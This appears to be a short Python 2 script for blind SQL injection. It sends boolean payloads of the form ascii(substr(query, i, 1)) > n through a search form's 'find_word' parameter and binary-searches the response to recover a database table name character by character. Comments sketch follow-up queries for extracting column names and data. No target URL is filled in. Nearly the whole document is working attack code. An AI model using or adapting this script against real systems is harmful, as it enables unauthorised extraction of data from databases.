import urllib
import urllib2

# Shape
# select * from board where Title='//' and substring((query), 1, 1) < 'a'--
# ???' and ascii(substring((query), 1, 1)) > 'a'#


# Get Table name
# select top 1 name from sysobjects where xtype='U'

# Get Column name
# select top 1 column_name from information_schema.columns where table_name = '[Table Name]'

# Get Data
# select top 1 [Column Name] from [Table Name]

URL=""

def check(response):
  if("2019" in response.read()):
	 return True
  else:
	 return False

def get_table_name(letter_index, num_start, num_end):
  #print(num_start, num_end)
  if(num_start > num_end):
	return num_start
	
  num_middle = (num_start + num_end)/2
  query = "select table_name from information_schema.tables where table_type='base table' limit 0,1"
  #injection_query = "dd' and substring((%s),1,1)<%d--" %(query, num_middle)
  injection_query = "dd' and ascii(substr((%s), %d, 1)) > %d#" %(query, letter_index, num_middle)
  param = {
	  'type':'title',
	  'search':'Go',
	  'find_word':injection_query
  }
  param = urllib.urlencode(param)
  request = urllib2.Request(URL+'?'+param)
  response = urllib2.urlopen(request)
  if(check(response)):
	return get_table_name(letter_index, num_middle + 1, num_end)
  else:
    return get_table_name(letter_index, num_start, num_middle - 1)

letter_index = 1
num = -1
while(num != 0):
	num = get_table_name(letter_index, 0, 0x100)
	print num, chr(num)
	letter_index += 1
